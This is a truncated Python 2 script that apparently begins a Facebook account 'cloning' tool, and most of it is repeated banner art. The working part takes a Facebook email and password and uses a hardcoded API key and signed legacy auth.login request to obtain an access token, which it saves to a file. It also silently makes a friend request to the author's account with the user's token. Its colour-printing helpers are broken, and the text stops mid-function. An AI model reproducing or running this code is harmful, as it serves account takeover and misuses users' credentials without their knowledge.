# GUN#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Tech Qaiser
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;96m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
R='\033[1;94m'

#Dev: qaiser
##### LOGO #####
logo = """
\033[1;97m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;97m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;97m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;97m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

       \033[1;97m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
      \033[1;97m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     
     \033[1;97m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      
    \033[1;97m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
   \033[1;97m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
  \033[1;91m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::   
  \033[1;92m                                                        CHECK              
  \033[1;91m:》》》\033[1;93m+923455453538\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
"""
logo2 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST 
"""
logo3 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo4 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo5 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo6 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo7 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo8 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo11 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

====================================
====================================

"""
logo12 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo13 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo14 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo15 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo16 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo17 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo18 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo19 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo20 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo21 = """	
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo22 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo23 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""
logo24 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST


"""
logo25 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;91m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[1;92m.....SO MI 
\033[1;93m.....BRAND BOY
\033[1;94m.....TOUR TOUCH SKY
\033[1;95m.....GAME CHANGER AWAN GANG
\033[1;96m.....FACEBOOK___SO_MI
\033[1;97m.....Whataap_03455453538
\033[1;97m.....NOTE
\033[1;91m.....RESPECT FIRST

"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;91mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;92m======================================
\033[1;96m_____________¶____¶_______________________________
\033[1;96m____________¶¶____¶¶______________________________
\033[1;96m___________¶¶¶___¶¶¶______________________________
\033[1;96m___________¶¶¶___¶¶¶______________________________
\033[1;96m___________¶¶___¶¶¶_______________________________
\033[1;96m___________¶¶___¶¶________________________________
\033[1;96m___________¶¶_¶¶__________________________________
\033[1;96m___________¶¶¶____________________________________
\033[1;96m____________¶¶____________________________________
\033[1;96m_____________888¶¶________________________________
\033[1;96m____________¶¶¶_8¶¶_______________________________
\033[1;96m____________¶¶¶¶_88¶______________________________
\033[1;96m_____________¶¶¶8_88¶_____________________________
\033[1;96m_____________8¶¶¶8_88¶____________________________
\033[1;96m______________¶¶¶¶__888___________________________
\033[1;96m______________¶¶¶¶¶_88¶8__________________________
\033[1;96m_______________¶¶¶¶¶_88¶8_________________________
\033[1;96m________________¶¶¶¶8_88¶8________________________
\033[1;96m________________¶¶¶¶¶__88¶________________________
\033[1;96m_________________¶¶¶¶¶_88¶________________________
\033[1;96m_________________¶¶¶¶¶¶_88¶_______________________
\033[1;96m________________¶¶¶¶¶¶¶8_88¶______________________
\033[1;96m______________8¶88¶88¶¶¶8_¶8¶_____________________
\033[1;96m______________¶¶_8¶¶¶¶¶¶¶_8¶8¶8___________________
\033[1;96m______________8¶8_8¶¶¶¶¶¶¶8¶¶8¶¶__________________
\033[1;96m_______________¶¶_8¶¶8¶¶¶¶88¶¶8¶¶8________________
\033[1;96m____________8888¶¶¶¶¶88¶¶8¶88¶¶¶¶8________________
\033[1;96m_________8888_88¶¶¶¶¶¶¶¶¶¶8¶__¶¶¶_________________
\033[1;96m________8_8888__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________________
\033[1;96m_______8_888_888___888¶¶¶¶¶¶¶¶¶¶__________________
\033[1;96m______8__8¶8__¶¶8_____88¶¶¶¶¶¶8___________________
\033[1;96m_____¶¶8888888__8888____8¶¶¶¶¶¶8__________________
\033[1;96m____¶¶¶¶¶¶88¶8___8¶¶88_8¶¶¶¶¶8¶8__________________
\033[1;96m___¶¶¶¶¶¶¶¶¶¶___8¶¶¶¶¶¶¶¶¶¶8_____________________
\033[1;96m_____¶¶¶8¶¶¶¶8__888¶¶888¶¶¶¶¶¶____________________
\033[1;96m______¶¶¶¶888¶8_88¶¶¶¶¶¶¶¶¶¶¶¶¶___________________
\033[1;96m_______¶¶¶¶888¶¶¶¶¶8¶¶¶¶¶¶¶¶¶¶¶¶__________________
\033[1;96m_______¶¶¶¶¶¶¶¶¶¶¶8___¶¶¶¶8¶¶¶¶¶¶_________________
\033[1;96m______8¶¶¶¶¶¶¶¶¶¶______¶88¶¶¶¶¶¶¶¶8_______________
\033[1;96m______¶8¶¶¶¶¶¶¶¶8______¶¶¶¶¶¶8888¶¶8______________
\033[1;96m_____8¶8¶¶¶8¶¶¶¶________¶¶¶888__8888¶8____________
\033[1;96m____8¶¶¶¶¶8¶¶¶¶¶________8¶8__88____888¶8__________
\033[1;96m___88_88¶¶¶¶¶¶¶__________88__888______88¶8________
\033[1;96m__88______888¶____________8____88________8¶8______

\033[1;92m█▀ █▀█ █▀▄▀█ █   █▄▄ █▀█ ▄▀█ █▄░█ █▀▄
\033[1;97m▄█ █▄█ █░▀░█ █   █▄█ █▀▄ █▀█ █░▀█ █▄▀
\033[1;91m Gun mari wife somi crime 2020


\033[1;97m-------------------

"""

CorrectUsername = "SOMI"
CorrectPassword = "SOMI"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;97mTool Username \x1b[1;97m------- \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:qaiser
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.youtube.comSOMIBRAND')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://www.youtube.comSOMIBRAND')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
	####login#########
def login():
	os.system('clear')
	print logo11
	print "1.\x1b[1;91mLogin  Facebook  "
        time.sleep(0.05)
        print "2.\x1b[1;92mWhat is acces Token How To Get Acces Token Free"
        time.sleep(0.05)
        print "3.\x1b[1;94mLogin Using Token"
        time.sleep(0.05)
	print "0.\033[1;95mExit           "
	pilih_login()
	
def pilih_login():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        os.system('xdg-open https://youtu.be/gO3sM5ZvTw4')
	        login()
	elif peak =="3":
	        tokenz()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan('  \033[1;96mNote Do Not Use Your Personal Account' )
		jalan(' \033[1;91mCreate New Account For Login Safely' )
		print "\033[1;94mNew Commands Use It For Cloning"
		print('	' )
		id = raw_input('\x1b[1;94mFacebook Email/Pass : \x1b[1;94m')
		pwd = raw_input('\x1b[1;94mPassword  \x1b[1;94m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successfully'
				os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;91mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
